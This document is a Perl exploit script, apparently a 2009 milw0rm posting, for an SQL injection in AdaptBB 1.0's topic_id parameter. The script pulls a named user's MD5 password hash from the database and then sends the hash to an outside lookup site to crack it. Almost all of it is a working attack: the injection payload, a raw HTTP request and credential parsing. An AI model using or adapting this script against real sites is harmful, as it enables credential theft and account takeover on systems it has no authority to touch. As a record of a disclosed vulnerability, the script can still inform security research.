#!/usr/bin/perl -w
#
# AdaptBB 1.0 (topic_id) SQL Injection / Credentials Disclosure Exploit
# 
# Description
# -----------
# AdaptBB contains a flaw that allows an attacker to carry out an SQL 
# injection attack. The issue is due to the inc/bb/topic.php script not 
# properly sanitizing user-supplied input to the 'topic_id' variable. This may 
# allow an attacker to inject or manipulate SQL queries in the backend 
# database if magic_quotes_gpc = off.
# -----------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it


use strict;
use LWP::Simple;
use IO::Socket;


our ($host,$path,$username) = @ARGV;

if (@ARGV != 3) 
{
       print "\n+-----------------------------------------------------------------------+\n".
             "\r| AdaptBB 1.0 (topic_id) SQL Injection / Credentials Disclosure Exploit |\n".
             "\r+-----------------------------------------------------------------------+\n".
             "\rby yeat - staker[at]hotmail[dot]it\n".
             "\nUsage: perl $0 host /path/ username\n".
             "\nhost: localhost\n".
             "\rpath: /adaptbb/\n".
             "\rusername: target username\n";
       exit;
}  

if ($username =~ /(\w+)/i) {
   print "Victim: $username\n";
   exploit();
}   

sub exploit
{
       my ($packet,$html,$inject,$socket);
       
       $inject = "%27/**/UNION/**/SELECT/**/password,2,3,4,5,6,7,8,9,10/**/".
                 "FROM/**/adaptbb_users/**/WHERE/**/username='$username'%23";
       
       $socket = new IO::Socket::INET(
                                      PeerAddr => $host,
                                      PeerPort => 80,
                                      Proto    => 'tcp',
                                    ) or die $!;
                                        
                                          
      $packet .= "GET $path/index.php?do=topic&topic_id=$inject\r\n";
      $packet .= "Host: $host\r\n";
      $packet .= "User-Agent: Lynx (textmode)\r\n";
      $packet .= "Connection: close\r\n\r\n";
      
      $socket->send($packet);
      
      while (<$socket>) {
         $html .= $_;
      }          
      
      if ($html =~ /Re: ([a-f0-9]{32})"/i) {
         print "Exploit successful\nMD5: $1\n";
         print "Password Cracked: ".search_md5($1)."\n";
      }
      else {
         print "Exploit unsuccesful..\n";
      }      
}      
    

sub search_md5
{
     my $hash = shift @_;
     my $cont = undef;
     
     if ($hash =~ /^([a-f0-9]{32})$/i) {
        return get("http://md5.rednoize.com/?p&s=md5&q=$hash");
     }
     else {
        return 404;
     }      
}   

# milw0rm.com [2009-04-03]
